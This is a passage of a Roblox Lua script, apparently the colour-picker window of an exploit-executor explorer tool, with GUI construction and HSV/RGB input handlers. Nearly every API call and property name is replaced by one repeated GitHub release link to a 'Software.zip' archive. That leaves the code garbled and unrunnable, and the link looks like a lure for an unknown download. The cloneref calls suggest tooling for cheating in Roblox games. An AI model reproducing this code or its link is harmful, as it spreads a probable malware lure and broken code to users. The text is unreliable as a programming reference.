				{76,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Down",Parent={70},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,8),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,8),Text="",TextSize=14,}},
				{77,"Frame",{BackgroundTransparency=1,Name="Arrow",Parent={76},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,8),}},
				{78,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={77},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,8,0,5),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,1),}},
				{79,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={77},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,7,0,4),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,1),}},
				{80,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={77},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,6,0,3),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,0,1),}},
				{81,"TextLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={68},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-40,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,34,1,0),Text="Sat:",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,TextXAlignment=1,}},
				{82,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.14901961386204,0.14901961386204,0.14901961386204),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.12549020349979,0.12549020349979,0.12549020349979),Name="Val",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-180,0,255),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,52,0,16),}},
				{83,"TextBox",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.25098040699959,0.25098040699959,0.25098040699959),BackgroundTransparency=1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.37647062540054,0.37647062540054,0.37647062540054),Font=3,Name="Input",Parent={82},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,50,0,16),Text="255",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,TextXAlignment=0,}},
				{84,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Name="ArrowFrame",Parent={83},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-16,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,1,0),}},
				{85,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Up",Parent={84},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,8),Text="",TextSize=14,}},
				{86,"Frame",{BackgroundTransparency=1,Name="Arrow",Parent={85},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,8),}},
				{87,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={86},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,8,0,3),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,1),}},
				{88,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={86},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,7,0,4),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,1),}},
				{89,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={86},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,6,0,5),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,0,1),}},
				{90,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Down",Parent={84},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,8),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,8),Text="",TextSize=14,}},
				{91,"Frame",{BackgroundTransparency=1,Name="Arrow",Parent={90},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,8),}},
				{92,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={91},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,8,0,5),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,1),}},
				{93,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={91},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,7,0,4),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,1),}},
				{94,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={91},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,6,0,3),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,0,1),}},
				{95,"TextLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={82},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-40,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,34,1,0),Text="Val:",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,TextXAlignment=1,}},
				{96,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.2352941185236,0.2352941185236,0.2352941185236),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.21568627655506,0.21568627655506,0.21568627655506),Font=3,Name="Cancel",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-105,1,-28),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,100,0,25),Text="Cancel",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,}},
				{97,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.2352941185236,0.2352941185236,0.2352941185236),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.21568627655506,0.21568627655506,0.21568627655506),Font=3,Name="Ok",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-210,1,-28),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,100,0,25),Text="OK",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,}},
				{98,"ImageLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.21568627655506,0.21568627655506,0.21568627655506),Image="rbxassetid://1072518502",Name="ColorStrip",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-30,0,5),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,13,0,200),}},
				{99,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.3137255012989,0.3137255012989,0.3137255012989),BackgroundTransparency=1,BorderSizePixel=0,Name="ArrowFrame",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-16,0,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,0,208),}},
				{100,"Frame",{BackgroundTransparency=1,Name="Arrow",Parent={99},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-2,0,-4),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,8,0,16),}},
				{101,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0),BorderSizePixel=0,Parent={100},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2,0,8),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,1),}},
				{102,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0),BorderSizePixel=0,Parent={100},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,7),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,3),}},
				{103,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0),BorderSizePixel=0,Parent={100},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,4,0,6),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,5),}},
				{104,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0),BorderSizePixel=0,Parent={100},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,0,5),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,7),}},
				{105,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0),BorderSizePixel=0,Parent={100},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,6,0,4),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,9),}},
			})
			local window = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			window:SetTitle("Color Picker")
			window:Resize(450,330)
			for i,v in pairs(guiContents:GetChildren()) do
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = window
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local pickerGui = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local pickerTopBar = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local pickerFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local colorSpace = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local colorStrip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local previewFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local basicColorsFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local customColorsFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local okButton = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local cancelButton = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local closeButton = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			local colorScope = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local colorArrow = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			local hueInput = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local satInput = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local valInput = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			local redInput = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local greenInput = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local blueInput = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			local user = cloneref(game["Run Service"].Parent:GetService("UserInputService"))
			local mouse = cloneref(game["Run Service"].Parent:GetService("Players")).LocalPlayer:GetMouse()

			local hue,sat,val = 0,0,1
			local red,green,blue = 1,1,1
			local chosenColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0)

			local basicColors = {https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.66666668653488,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0.33333334326744,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.66666668653488,0.33333334326744,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0.66666668653488,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.66666668653488,0.66666668653488,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.66666668653488,1,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0.49803924560547),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.66666668653488,0,0.49803924560547),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0.33333334326744,0.49803924560547),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.66666668653488,0.33333334326744,0.49803924560547),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0.66666668653488,0.49803924560547),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.66666668653488,0.66666668653488,0.49803924560547),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0.49803924560547),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.66666668653488,1,0.49803924560547),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.66666668653488,0,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0.33333334326744,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.66666668653488,0.33333334326744,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0.66666668653488,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.66666668653488,0.66666668653488,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.66666668653488,1,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.33333334326744,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.33333334326744,0.33333334326744,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0.33333334326744,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.33333334326744,0.66666668653488,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0.66666668653488,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.33333334326744,1,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.33333334326744,0,0.49803924560547),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0.49803924560547),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.33333334326744,0.33333334326744,0.49803924560547),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0.33333334326744,0.49803924560547),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.33333334326744,0.66666668653488,0.49803924560547),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0.66666668653488,0.49803924560547),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.33333334326744,1,0.49803924560547),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,0.49803924560547),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.33333334326744,0,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.33333334326744,0.33333334326744,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0.33333334326744,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.33333334326744,0.66666668653488,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0.66666668653488,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.33333334326744,1,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1)}
			local customColors = {}

			local function updateColor(noupdate)
				local relativeX,relativeY,relativeStripY = 219 - hue*219, 199 - sat*199, 199 - val*199
				local hsvColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(hue,sat,val)

				if noupdate == 2 or not noupdate then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = tostring(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(359*hue))
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = tostring(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(255*sat))
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = tostring(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(255*val))
				end
				if noupdate == 1 or not noupdate then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = tostring(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(255*red))
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = tostring(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(255*green))
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = tostring(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(255*blue))
				end

				chosenColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(red,green,blue)

				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,relativeX-9,0,relativeY-9)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(hue,sat,1)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-2,0,relativeStripY-4)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = chosenColor

				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = chosenColor
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(chosenColor)
			end

			local function colorSpaceInput()
				local relativeX = mouse.X - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local relativeY = mouse.Y - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

				if relativeX < 0 then relativeX = 0 elseif relativeX > 219 then relativeX = 219 end
				if relativeY < 0 then relativeY = 0 elseif relativeY > 199 then relativeY = 199 end

				hue = (219 - relativeX)/219
				sat = (199 - relativeY)/199

				local hsvColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(hue,sat,val)
				red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b

				updateColor()
			end

			local function colorStripInput()
				local relativeY = mouse.Y - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

				if relativeY < 0 then relativeY = 0 elseif relativeY > 199 then relativeY = 199 end	

				val = (199 - relativeY)/199

				local hsvColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(hue,sat,val)
				red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b

				updateColor()
			end

			local function hookButtons(frame,func)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0.5
					elseif https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
						local releaseEvent,runEvent

						local startTime = tick()
						local pressing = true
						local startNum = tonumber(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)

						if not startNum then return end

						releaseEvent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
							if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end
							releaseEvent:Disconnect()
							pressing = false
						end)

						startNum = startNum + 1
						func(startNum)
						while pressing do
							if tick()-startTime > 0.3 then
								startNum = startNum + 1
								func(startNum)
							end
							wait(0.1)
						end
					end
				end)

				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
					end
				end)

				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0.5
					elseif https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
						local releaseEvent,runEvent

						local startTime = tick()
						local pressing = true
						local startNum = tonumber(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)

						if not startNum then return end

						releaseEvent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
							if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end
							releaseEvent:Disconnect()
							pressing = false
						end)

						startNum = startNum - 1
						func(startNum)
						while pressing do
							if tick()-startTime > 0.3 then
								startNum = startNum - 1
								func(startNum)
							end
							wait(0.1)
						end
					end
				end)

				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
					end
				end)
			end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					local releaseEvent,mouseEvent

					releaseEvent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
						if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end
						releaseEvent:Disconnect()
						mouseEvent:Disconnect()
					end)

					mouseEvent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
						if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
							colorSpaceInput()
						end
					end)

					colorSpaceInput()
				end
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					local releaseEvent,mouseEvent

					releaseEvent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
						if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end
						releaseEvent:Disconnect()
						mouseEvent:Disconnect()
					end)

					mouseEvent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
						if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
							colorStripInput()
						end
					end)

					colorStripInput()
				end
			end)

			local function updateHue(str)
				local num = tonumber(str)
				if num then
					hue = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(num),0,359)/359
					local hsvColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(hue,sat,val)
					red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = tostring(hue*359)
					updateColor(1)
				end
			end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function() updateHue(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) end) hookButtons(hueInput,updateHue)

			local function updateSat(str)
				local num = tonumber(str)
				if num then
					sat = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(num),0,255)/255
					local hsvColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(hue,sat,val)
					red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = tostring(sat*255)
					updateColor(1)
				end
			end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function() updateSat(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) end) hookButtons(satInput,updateSat)

			local function updateVal(str)
				local num = tonumber(str)
				if num then
					val = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(num),0,255)/255
					local hsvColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(hue,sat,val)
					red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = tostring(val*255)
					updateColor(1)
				end
			end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function() updateVal(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) end) hookButtons(valInput,updateVal)

			local function updateRed(str)
				local num = tonumber(str)
				if num then
					red = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(num),0,255)/255
					local newColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(red,green,blue)
					hue,sat,val = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(newColor)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = tostring(red*255)
					updateColor(2)
				end
			end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function() updateRed(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) end) hookButtons(redInput,updateRed)

			local function updateGreen(str)
				local num = tonumber(str)
				if num then
					green = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(num),0,255)/255
					local newColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(red,green,blue)
					hue,sat,val = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(newColor)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = tostring(green*255)
					updateColor(2)
				end
			end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function() updateGreen(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) end) hookButtons(greenInput,updateGreen)

			local function updateBlue(str)
				local num = tonumber(str)
				if num then
					blue = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(num),0,255)/255
					local newColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(red,green,blue)
					hue,sat,val = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(newColor)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = tostring(blue*255)
					updateColor(2)
				end
			end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function() updateBlue(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) end) hookButtons(blueInput,updateBlue)

			local colorChoice = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("TextButton")
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "Choice"
